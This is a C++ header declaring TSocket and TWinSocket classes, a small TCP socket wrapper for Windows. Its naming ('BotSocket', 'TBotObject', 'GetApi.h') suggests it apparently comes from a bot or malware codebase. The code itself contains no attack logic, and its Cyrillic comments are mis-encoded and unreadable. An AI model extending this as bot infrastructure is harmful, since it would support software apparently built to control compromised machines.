//---------------------------------------------------------------------------
//  ������ ����������� ������ � ��������
//
//  �����: 0.1
//  �������������: ��� 2012
//---------------------------------------------------------------------------

#ifndef BotSocketH
#define BotSocketH
//---------------------------------------------------------------------------


#include "windows.h"
#include "GetApi.h"



class TSocket;


//--------------------------------------------------------
//  CreateSocket - ������� ������ ����� ������ � ������-
//			       ����� �� ���������� �������� �������
//  �� ��������� ������������ Windows ������ � ��������
//  ����� TWinSocket
//--------------------------------------------------------
TSocket* CreateSocket();





//***************************************************************
//  TSocket - ������� ����� ��� ������ � TCP �������
//***************************************************************
class TSocket : public TBotObject
{
protected:
	bool virtual DoConnect(const char *HostName, WORD Port, DWORD Timeout) { return false; }
public:
    ~TSocket();

	bool Connect(const char *HostName, WORD Port);
	bool Connect(const char *HostName, WORD Port, DWORD Timeout);
	void virtual Close() {};
	int  virtual Write(const void* Buf, DWORD BufSize)  { return 0; }
    int  virtual Read(void* Buf, DWORD BufSize)         { return 0; }
};




//***************************************************************
//  TWinSocket - ����� ��� ������ � TCP �������
//				 ��������� WinSocket
//***************************************************************
class TWinSocket : public TSocket
{
protected:
	bool DoConnect(const char *HostName, WORD Port, DWORD Timeout);
public:
	TWinSocket();
	void Close();
	int Write(const void* Buf, DWORD BufSize);
    int Read(void* Buf, DWORD BufSize);
};


//---------------------------------------------------------------------------
#endif
